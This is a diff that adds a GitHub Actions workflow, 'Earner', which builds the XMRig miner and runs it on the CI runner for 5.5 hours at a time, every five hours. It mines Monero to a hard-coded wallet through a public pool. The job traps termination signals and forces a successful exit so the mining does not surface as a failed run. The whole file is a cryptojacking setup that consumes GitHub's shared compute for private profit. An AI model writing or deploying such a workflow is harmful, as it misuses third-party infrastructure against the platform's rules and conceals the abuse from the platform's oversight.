@@ -1,0 +1,40 @@
+name: Earner
+
+on:
+  schedule:
+    - cron: '0 */5 * * *'  # Every 5 hours
+  workflow_dispatch:
+
+jobs:
+  xmrig:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Install dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y build-essential git cmake libssl-dev
+
+      - name: Clone XMRig
+        run: git clone https://github.com/xmrig/xmrig.git
+
+      - name: Build XMRig
+        run: |
+          cd xmrig
+          mkdir build && cd build
+          cmake ..
+          make -j$(nproc)
+
+      - name: Run XMRig for 5 hours 30 minutes with clean exit
+        run: |
+          cd xmrig/build
+
+          # Graceful handling of SIGTERM to prevent workflow failure
+          trap "echo 'Job canceled, exiting successfully'; exit 0" SIGTERM
+
+          # Run XMRig for 5.5 hours (19800 seconds)
+          timeout 19800s ./xmrig \
+            -o pool.supportxmr.com:7777 \
+            -u 44SpTnkYyc9NmH3QjJkoLtVc3DXXJGwfD7tvhF1zwNRz9JbAMeHNiCD4wb8ivNvo3edgrntc3ra1meA5uZhT3vbaJ1ApPT1 \
+            -p github-run \
+            -t $(nproc) || exit 0
